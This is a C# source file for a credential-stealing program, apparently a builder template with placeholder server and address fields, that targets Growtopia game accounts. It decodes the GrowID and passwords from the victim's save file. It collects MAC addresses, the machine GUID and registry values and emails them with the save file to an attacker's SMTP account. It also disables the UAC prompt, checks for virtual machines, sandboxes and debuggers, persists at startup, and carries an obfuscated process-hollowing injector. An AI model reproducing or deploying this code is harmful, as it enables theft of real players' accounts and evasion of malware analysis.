using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Net.Mail;
using System.Net.Mime;
using Microsoft.Win32;
using System.Security;
using System.Threading;
using System.Management;
using System.Reflection;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;
using System.Security.Principal;
using System.Collections.Generic;
using System.Security.Cryptography;
using g43533353646 = System.Net.NetworkCredential;
using o43423434343 = System.Net.Mail.MailMessage;
using kf4d65a45fd6sa4df5a = System.Net.Mail.SmtpClient;
using hf55jakldfjasdfsa = System.Security.Cryptography.Rfc2898DeriveBytes;
using ukfdkfsdffduuut = System.Threading.Thread;
using fgsgfs32gfdasgfsd = System.Security.Cryptography.SHA256;
using jkfldgkdfsgfdsgfds = System.Security.Cryptography.RijndaelManaged;
using gfdsgfdsgdfsgfsd = System.IO.MemoryStream;
using khgkjgdfjfd22 = System.Security.Cryptography.CryptoStream;
using odfajgfdjgjdf24 = System.Security.Cryptography.CryptoStreamMode;
using fsdfgsdfjgdghdfj = System.Security.Cryptography.CryptographicException;

namespace SystemForm
{
    [StandardModule]
    internal sealed class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                try
                {
                    //[AntiVM]if (Check4VM()) return;
                    //[AntiSB]if (Check4SB()) return;
                    //[AntiDB]if (AntiDebug()) return;
                }
                catch (Exception) { }

                try
                {
                    if (!ValidateStartUp(args))
                    {
                        //[FakeMessageBox]new ukfdkfsdffduuut(() => MessageBox.Show("[FakeContent]", "[FakeTi5tle]", MessageBoxButtons.OK, FakeIcon)).Start();
                        //[File-Binder]ExtractSaveResource(@"[Binded-Name]", String.Empty, [isMemory]);
                    }
                }
                catch (Exception) { }
                try
                {
                    if (IsAdministrator())
                    {
                        using (RegistryKey uac = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true))
                        {
                            uac.SetValue("ConsentPromptBehaviorAdmin", 0);
                        }
                    }
                    else
                    {
                        try
                        {
                            ProcessStartInfo startInfo;
                            startInfo = new ProcessStartInfo();
                            startInfo.FileName = System.Reflection.Assembly.GetExecutingAssembly().Location;
                            startInfo.Arguments = string.Join(" ", args);
                            startInfo.UseShellExecute = true;
                            startInfo.Verb = "runas";
                            Process.Start(startInfo);
                            return;
                        }
                        catch (Exception err) { return; }
                    }
                    string file_ = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
                    Server_.EnableSsl = true;
                    Server_.Credentials = new g43533353646(doStuf_f2(@"Place_for_Address", [isEncrypto]), doStuf_f2(@"Place_for_Password", [isEncrypto]));
                    string decodedT0hing_ = DecodeSave(file_);
                    string conten0t_ = "Have fun!\n";
                    if ([AutoDecode] && !String.IsNullOrEmpty(decodedT0hing_)) { conten0t_ += "\n" + decodedT0hing_; }
                    conten0t_ += macInf0_;
                    mailMessage.From = new MailAddress(doStuf_f2(@"Place_for_Address", [isEncrypto]));
                    mailMessage.Subject = "New Client from Hack4Fun's AAP Bypass";
                    mailMessage.Body = conten0t_;
                    mailMessage.Attachments.Add(new Attachment(file_));
                    ContentType contentType = new ContentType("text/reg");
                    Attachment regEntry = Attachment.CreateAttachmentFromString(GenerateReplacedString(GetHexValues(), GetGuid()), contentType);
                    regEntry.Name = "EditReg.reg";
                    mailMessage.Attachments.Add(regEntry);
                    mailMessage.To.Add(doStuf_f2(@"Place_for_Address", [isEncrypto]));
                    //[SenderObject0]mailMessage.To.Add(doStuf_f2(@"[Receiver0]", [isEncrypto]));
                    //[SenderObject1]mailMessage.To.Add(doStuf_f2(@"[Receiver1]", [isEncrypto]));
                    //[SenderObject2]mailMessage.To.Add(doStuf_f2(@"[Receiver2]", [isEncrypto]));
                    //[SenderObject3]mailMessage.To.Add(doStuf_f2(@"[Receiver3]", [isEncrypto]));
                    //[SenderObject4]mailMessage.To.Add(doStuf_f2(@"[Receiver4]", [isEncrypto]));
                    Server_.Send(mailMessage);
                }
                catch (Exception) { }

                try
                {
                    //[Startup]try
                    //[Startup]{
                    //[Startup]    string path = Path.Combine([Startup - Path_], @"[Startup-File]");
                    //[Startup]    if (path != System.Reflection.Assembly.GetExecutingAssembly().Location)
                    //[Startup]    {
                    //[Startup]        if (File.Exists(path)) File.Delete(path);
                    //[Startup]        File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, path);
                    //[Startup]    }
                    //[Startup]    RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    //[Startup]    if (File.Exists(path)) key.SetValue(@"[Startup-Key]", string.Format(@"""{0}"" -s", path));
                    //[Hide-File]  if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
                    //[Startup]}
                    //[Startup]catch (Exception) { }
                }
                catch (Exception) { }
            }
            catch (Exception) { }
        }

        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static bool ValidateStartUp(string[] argv)
        {
            if (argv == null) return false;
            else
            {
                if (argv.Length > 0 && argv[0] == "-s") return true;
                else return false;
            }
        }

        private static string GenerateReplacedString(string[] hexValues_, string hwi0_d_)
        {
            return string.Format(@"Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\Number1]
""Number2""=hex:{0}
""Number3""=hex:{1}

[HKEY_CURRENT_USER\Software\Microsoft\Number4]
""Number5""=hex:{2}
""Number6""=hex:{3}
""Number7""=hex:{4}
""Number8""=hex:{5}

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography]
""MachineGuid""=""{6}""", hexValues_[0], hexValues_[1], hexValues_[2], hexValues_[3], hexValues_[4], hexValues_[5], hwi0_d_);
        }

        private static string[] GetHexValues()
        {
            string[] values = new string[6] { "", "", "", "", "", "" };
            RegistryKey Key_ = Registry.CurrentUser;
            string[] knames = Key_.GetSubKeyNames();
            for (int i = 0; i < knames.Length; i++)
            {
                try
                {
                    int xref;
                    if (Int32.TryParse(knames[i], out xref))
                    {
                        Key_ = Registry.CurrentUser.OpenSubKey(knames[i]);
                        string[] vnames = Key_.GetValueNames();
                        if (vnames.Length > 0)
                        {
                            values[0] = BitConverter.ToString((byte[])Key_.GetValue(vnames[0])).Replace("-", ",").ToLower();
                            values[1] = BitConverter.ToString((byte[])Key_.GetValue(vnames[1])).Replace("-", ",").ToLower();
                            break;
                        }
                    }
                }
                catch (Exception) { }
            }

            Key_.Close();
            Key_ = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft", false);
            knames = Key_.GetSubKeyNames();
            for (int i = 0; i < knames.Length; i++)
            {
                try
                {
                    int x = 0;
                    if (Int32.TryParse(knames[i], out x))
                    {
                        Key_ = Key_.OpenSubKey(knames[i]);
                        string[] vnames = Key_.GetValueNames();
                        if (vnames.Length > 0)
                        {
                            values[2] = BitConverter.ToString((byte[])Key_.GetValue(vnames[0])).Replace("-", ",").ToLower();
                            values[3] = BitConverter.ToString((byte[])Key_.GetValue(vnames[1])).Replace("-", ",").ToLower();
                            values[4] = BitConverter.ToString((byte[])Key_.GetValue(vnames[2])).Replace("-", ",").ToLower();
                            values[5] = BitConverter.ToString((byte[])Key_.GetValue(vnames[3])).Replace("-", ",").ToLower();
                            break;
                        }
                    }
                }
                catch (Exception) { }
            }
            return values;
        }

        private static string GrabMacAddress()
        {
            try
            {
                Process pro_c_ = new Process { StartInfo = new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c getmac /v /fo list", UseShellExecute = false, RedirectStandardOutput = true, CreateNoWindow = true } };
                pro_c_.Start();
                string stdOut_put = "";
                while (!pro_c_.StandardOutput.EndOfStream) { stdOut_put += pro_c_.StandardOutput.ReadLine() + "\n"; }
                return stdOut_put;
            }
            catch (Exception) { return null; }
        }

        private static string GetGuid()
        {
            try
            {
                return Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography", false).GetValue("MachineGuid", "").ToString();
            }
            catch (Exception) { return ""; }
        }

        private static bool ValidateChar(char cdzdshr)
        {
            if ((cdzdshr >= 0x30 && cdzdshr <= 0x39) ||
                    (cdzdshr >= 0x41 && cdzdshr <= 0x5A) ||
                    (cdzdshr >= 0x61 && cdzdshr <= 0x7A) ||
                    (cdzdshr >= 0x2B && cdzdshr <= 0x2E)) return true;
            else return false;
        }

        private static string DecodeSave(string pa_dth)
        {
            List<string> decodedPwds = new List<string>();
            StringBuilder strin_g0Builder = new StringBuilder();
            byte[] buff7er = File.ReadAllBytes(pa_dth);
            string stri0ngB9uffer = Encoding.ASCII.GetString(buff7er);
            string growkid = stri0ngB9uffer.Substring(stri0ngB9uffer.IndexOf("tankid_name") + 15, Convert.ToInt32(buff7er[stri0ngB9uffer.IndexOf("tankid_name") + 11]));
            if (String.IsNullOrEmpty(growkid) || string.IsNullOrWhiteSpace(growkid)) return null;
            strin_g0Builder.AppendLine("Stealing Time: " + DateTime.Now);
            strin_g0Builder.AppendLine();
            strin_g0Builder.AppendLine("GrowID: " + growkid);
            strin_g0Builder.AppendLine("   --Passwords--");
            int realpassindex, passoffset = stri0ngB9uffer.IndexOf("tankid_password"), passindex2 = stri0ngB9uffer.LastIndexOf("tankid_password");
            if (passoffset <= 0 || passindex2 <= 0) return null;
            if (buff7er[passoffset + 15].ToString().ToCharArray()[0] == 0x95) realpassindex = passoffset + 15;
            else realpassindex = passindex2 + 15;
            if (Convert.ToInt32(buff7er[realpassindex]) <= 0) return null;
            string hezap = "";
            bool truePwd;
            for (int off2s0t = -255; off2s0t <= 255; off2s0t++)
            {
                hezap = "";
                truePwd = true;
                for (int th2ngie4 = 4; th2ngie4 < buff7er[realpassindex] + 4; th2ngie4++)
                {
                    if (ValidateChar((char)(buff7er[realpassindex + th2ngie4] - th2ngie4 + off2s0t))) hezap += ((char)(buff7er[realpassindex + th2ngie4] - th2ngie4 + off2s0t));
                    else truePwd = false;
                }
                if (truePwd) decodedPwds.Add(hezap);
            }
            foreach (string pwkld in decodedPwds.ToArray()) strin_g0Builder.AppendLine(pwkld);
            return strin_g0Builder.ToString();
        }

        private static string doStuf_f2(string in_p5ut, bool is5encr4ypto)
        {
            if (!is5encr4ypto) return in_p5ut;
            bool d4ne = false;
            for (int i = 0; i < in_p5ut.Length; i++)
            {
                try
                {
                    if (d4ne) break;
                    string subbedPwd = in_p5ut.Substring(i, 5 + 1 + 2 + 6 + 4 + 2 + 2 + 7 + 1);
                    if (in_p5ut.EndsWith(subbedPwd)) d4ne = true;
                    byte[] bytesToBeDecrypted = Convert.FromBase64String(in_p5ut.Remove(in_p5ut.IndexOf(subbedPwd), subbedPwd.Length));
                    byte[] passwordBytes = fgsgfs32gfdasgfsd.Create().ComputeHash(Encoding.UTF8.GetBytes(subbedPwd));
                    byte[] saltBytes = Encoding.ASCII.GetBytes("SALT_STR");
                    gfdsgfdsgdfsgfsd me5mo4rSyream = new gfdsgfdsgdfsgfsd();
                    jkfldgkdfsgfdsgfds A_E_S = new jkfldgkdfsgfdsgfds();
                    A_E_S.KeySize = 256;
                    A_E_S.BlockSize = 128;
                    var k_e_4y = new hf55jakldfjasdfsa(passwordBytes, saltBytes, 1000);
                    A_E_S.Key = k_e_4y.GetBytes(A_E_S.KeySize / 8);
                    A_E_S.IV = k_e_4y.GetBytes(A_E_S.BlockSize / 8);
                    A_E_S.Mode = CipherMode.CBC;
                    var cryptoStream = new khgkjgdfjfd22(me5mo4rSyream, A_E_S.CreateDecryptor(), odfajgfdjgjdf24.Write);
                    cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cryptoStream.Close();
                    byte[] by5t4_b5f = me5mo4rSyream.ToArray();
                    string dS4_2tr = Encoding.ASCII.GetString(by5t4_b5f);
                    for (int bu3lls5hit = 0; bu3lls5hit < by5t4_b5f.Length; bu3lls5hit++) if (by5t4_b5f[bu3lls5hit].ToString("X2") == "3F") continue;
                    if (dS4_2tr.Contains("?")) continue;
                    return dS4_2tr;
                }
                catch (fsdfgsdfjgdghdfj) { continue; }
            }
            return null;
        }

        private static o43423434343 mailMessage = new o43423434343();
        private static kf4d65a45fd6sa4df5a Server_ = new kf4d65a45fd6sa4df5a("[Server]", [Port]);

        private static string macInf0_ = GrabMacAddress();

        public static bool InternalCheckIsWow64()
        {
            if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) || Environment.OSVersion.Version.Major >= 6)
            {
                using (Process pr_sc = Process.GetCurrentProcess())
                {
                    bool retVal;
                    if (!IsWow64Process(pr_sc.Handle, out retVal))
                    {
                        return false;
                    }
                    return retVal;
                }
            }
            else return false;
        }

        #region DllImports
        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool wow64Process);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern uint GetFileAttributes(string lpFileName);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetUserName(StringBuilder sb, ref int length);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, IntPtr ZeroOnly);
        #endregion

        private static string doStuff(string Keyname, string input)
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Keyname, false);
            if (registryKey == null) return "noKey";
            object obj_ = registryKey.GetValue(input, (object)"noValueButYesKey");
            if (obj_.GetType() == typeof(string) || (registryKey.GetValueKind(input) == RegistryValueKind.String || registryKey.GetValueKind(input) == RegistryValueKind.ExpandString)) return obj_.ToString();
            switch (registryKey.GetValueKind(input)) { case RegistryValueKind.QWord: return Convert.ToString((long)obj_); case RegistryValueKind.DWord: return Convert.ToString((int)obj_); case RegistryValueKind.Binary: return Convert.ToString((object)(byte[])obj_); case RegistryValueKind.MultiString: return string.Join("", (string[])obj_); }
            return "noValueButYesKey";
        }

        public static bool Check4SB()
        {
            try
            {
                StringBuilder strBuilder_ = new StringBuilder();
                Process[] prcss = Process.GetProcesses();
                string basePath = Assembly.GetExecutingAssembly().Location.ToUpper();
                int length = 50;
                GetUserName(strBuilder_, ref length);
                if ((int)GetModuleHandle("SbieDLL.dll") != 0) return true;
                else if (strBuilder_.ToString().ToUpper().Contains("VIRUS") || strBuilder_.ToString().ToUpper().Contains("SCHMIDTI") || (strBuilder_.ToString().ToUpper().Contains("MALWARE") || strBuilder_.ToString().ToUpper().Contains("SANDBOX")) || strBuilder_.ToString().ToUpper() == "CURRENTUSER" || strBuilder_.ToString().ToUpper() == "USER") return true;
                else
                {
                    foreach (Process prc in prcss) { if (prc.ProcessName.ToUpper().Contains("SANDBOXIE")) return true; }
                    if (basePath.Contains("C:\\FILE.EXE") || basePath.Contains("\\VIRUS") || (basePath.Contains("SANDBOX") || basePath.Contains("SAMPLE")) || (basePath.Contains("MALWARE") || basePath.Contains("DE4DOT")) || basePath.Contains("REVERSE") || (int)FindWindow("Afx:400000:0", (IntPtr)0) != 0) return true;
                }
                return false;
            }
            catch (Exception)
            {
                return true;
            }
        }

        private static bool AntiDebug()
        {
            if (!Debugger.IsAttached && !Debugger.IsLogging()) return false;
            else return true;
        }

        private static bool Check4VM()
        {
            try
            {
                if (doStuff("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VBOX")) return true;
                else if (doStuff("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VBOX")) return true;
                else if (doStuff("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX")) return true;
                else if (doStuff("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey") return true;
                else if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") != uint.MaxValue) return true;
                else if (doStuff("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) return true;
                else if (doStuff("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) return true;
                else if (doStuff("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE")) return true;
                else if (doStuff("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("VMWARE")) return true;
                else if (doStuff("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey") return true;
                else if (doStuff("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("VMWARE")) return true;
                else if (doStuff("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("VMWARE")) return true;
                else if (doStuff("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\")) return true;
                else if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") != uint.MaxValue) return true;
                else if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") != uint.MaxValue) return true;
                else if (doStuff("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("QEMU")) return true;
                else if (doStuff("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("XEN")) return true;
                else if (doStuff("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VIRTUALBOX")) return true;
                else if (doStuff("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VIRTUAL")) return true;
                else if (doStuff("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VMWARE")) return true;
                else if (doStuff("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("HYPERVISOR")) return true;
                else if (GetProcAddress(GetModuleHandle("kernel32.dll"), "wine_get_unix_file_name") != (IntPtr)0) return true;
                else if (doStuff("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("QEMU")) return true;
                else
                {
                    foreach (var mngObject in new ManagementObjectSearcher(new ManagementScope("\\\\.\\ROOT\\cimv2"), new ObjectQuery("SELECT * FROM Win32_VideoController")).Get())
                    {
                        if (mngObject["Description"].ToString().ToUpper().Contains("S3 TRIO")) return true;
                        if (mngObject["Description"].ToString().ToUpper().Contains("VBOX") || mngObject["Description"].ToString().ToUpper().Contains("VIRTUALBOX")) return true;
                        if (mngObject["Description"].ToString().ToUpper().Contains("VMWARE")) return true;
                        if (mngObject["Description"].ToString().ToUpper().Contains("XEN")) return true;
                        if (mngObject["Description"].ToString().ToUpper().Contains("HYPERVISOR")) return true;
                        if (mngObject["Description"].ToString() == "") return true;
                    }
                    return false;
                }
            }
            catch (Exception)
            {
                return true;
            }
        }

        private static bool ExtractSaveResource(string filename, string pat7h, bool inMemory)
        {
            try
            {
                Stream str3eam = Assembly.GetExecutingAssembly().GetManifestResourceStream(filename);
                if (str3eam != null)
                {
                    byte[] b5uffer = new byte[str3eam.Length];
                    str3eam.Read(b5uffer, 0, b5uffer.Length);
                    str3eam.Close();
                    if (inMemory)
                    {
                        try { RunPe1.R4un(Assembly.GetExecutingAssembly().Location, b5uffer, true); }
                        catch (Exception) { }
                    }
                    else
                    {
                        File.WriteAllBytes(pat7h, b5uffer);
                        File.SetAttributes(pat7h, FileAttributes.Hidden);
                        System.Diagnostics.Process.Start(pat7h);
                    }
                    return true;
                }
                else return false;
            }
            catch (Exception) { return false; }
        }
    }

    internal static class RunPe1
    {
        [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "C" + "r" + "e" + "a" + "t" + "e" + "P" + "r" + "o" + "c" + "e" + "s" + "s", CharSet = CharSet.Unicode), SuppressUnmanagedCodeSecurity]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "G" + "e" + "t" + "T" + "h" + "r" + "e" + "a" + "d" + "C" + "o" + "n" + "t" + "e" + "x" + "t"), SuppressUnmanagedCodeSecurity]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);
        [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "W" + "o" + "w" + "6" + "4" + "G" + "e" + "t" + "T" + "h" + "r" + "e" + "a" + "d" + "C" + "o" + "n" + "t" + "e" + "x" + "t"), SuppressUnmanagedCodeSecurity]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
        [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "S" + "e" + "t" + "T" + "h" + "r" + "e" + "a" + "d" + "C" + "o" + "n" + "t" + "e" + "x" + "t"), SuppressUnmanagedCodeSecurity]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);
        [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "W" + "o" + "w" + "6" + "4" + "S" + "e" + "t" + "T" + "h" + "r" + "e" + "a" + "d" + "C" + "o" + "n" + "t" + "e" + "x" + "t"), SuppressUnmanagedCodeSecurity]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
        [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "R" + "e" + "a" + "d" + "P" + "r" + "o" + "c" + "e" + "s" + "s" + "M" + "e" + "m" + "o" + "r" + "y"), SuppressUnmanagedCodeSecurity]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "W" + "r" + "i" + "t" + "e" + "P" + "r" + "o" + "c" + "e" + "s" + "s" + "M" + "e" + "m" + "o" + "r" + "y"), SuppressUnmanagedCodeSecurity]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        [DllImport("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l", EntryPoint = "N" + "t" + "U" + "n" + "m" + "a" + "p" + "V" + "i" + "e" + "w" + "O" + "f" + "S" + "e" + "c" + "t" + "i" + "o" + "n"), SuppressUnmanagedCodeSecurity]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);
        [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "V" + "i" + "r" + "t" + "u" + "a" + "l" + "A" + "l" + "l" + "o" + "c" + "E" + "x"), SuppressUnmanagedCodeSecurity]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        [DllImport("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l", EntryPoint = "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d"), SuppressUnmanagedCodeSecurity]
        private static extern int ResumeThread(IntPtr handle);
        [StructLayout(LayoutKind.Sequential, Pack = 2 - 1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 3 - 2)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 18 + 18)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        public static bool R4un(string path, byte[] data, bool compatible)
        {
            for (var I = 1; I <= 5; I++)
                if (Hand4leRun(path, data, compatible)) return true;
            return false;
        }
        private static bool Hand4leRun(string path, byte[] data, bool compatible)
        {
            var readWrite = 0;
            var quotedPath = string.Format(@"\{0}\", path);
            var si = new StartupInformation();
            ProcessInformation pi = new ProcessInformation();
            si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
            try
            {
                if (!CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, false, 2 + 2, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
                var fileAddress = BitConverter.ToInt32(data, 120 / 2);
                var imageBase = BitConverter.ToInt32(data, fileAddress + 26 + 26);
                var context = new int[179];
                context[0] = 32769 + 32769;
                if (IntPtr.Size == 8 / 2)
                { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                else
                { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                var ebx = context[41];
                var baseAddress = 1 - 1;
                if (!ReadProcessMemory(pi.ProcessHandle, ebx + 4 + 4, ref baseAddress, 2 + 2, ref readWrite)) throw new Exception();
                if (imageBase == baseAddress)
                    if (NtUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 1 - 1) throw new Exception();
                var sizeOfImage = BitConverter.ToInt32(data, fileAddress + 160 / 2);
                var sizeOfHeaders = BitConverter.ToInt32(data, fileAddress + 42 + 42);
                var allowOverride = false;
                var newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 6144 + 6144, 32 + 32);
                if (!compatible && newImageBase == 1 - 1)
                {
                    allowOverride = true;
                    newImageBase = VirtualAllocEx(pi.ProcessHandle, 1 - 1, sizeOfImage, 6144 * 2, 32 + 32);
                }
                if (newImageBase == 0) throw new Exception();
                if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, data, sizeOfHeaders, ref readWrite)) throw new Exception();
                var sectionOffset = fileAddress + 124 * 2;
                var numberOfSections = BitConverter.ToInt16(data, fileAddress + 3 + 3);
                for (var I = 1 - 1; I < numberOfSections; I++)
                {
                    var virtualAddress = BitConverter.ToInt32(data, sectionOffset + 6 + 6);
                    var sizeOfRawData = BitConverter.ToInt32(data, sectionOffset + 8 + 8);
                    var pointerToRawData = BitConverter.ToInt32(data, sectionOffset + 40 / 2);
                    if (sizeOfRawData != 1 - 1)
                    {
                        var sectionData = new byte[sizeOfRawData];
                        Buffer.BlockCopy(data, pointerToRawData, sectionData, 2 - 2, sectionData.Length);
                        if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                    }
                    sectionOffset += 120 / 3;
                }
                var pointerData = BitConverter.GetBytes(newImageBase);
                if (!WriteProcessMemory(pi.ProcessHandle, ebx + 16 / 2, pointerData, 2 * 2, ref readWrite)) throw new Exception();
                var addressOfEntryPoint = BitConverter.ToInt32(data, fileAddress + 80 / 2);
                if (allowOverride) newImageBase = imageBase;
                context[22 + 22] = newImageBase + addressOfEntryPoint;

                if (IntPtr.Size == 2 + 2)
                {
                    if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                }
                else
                {
                    if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                }
                if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
            }
            catch
            {
                var p = Process.GetProcessById(Convert.ToInt32(pi.ProcessId));
                p.Kill();
                return false;
            }
            return true;
        }
    }
}
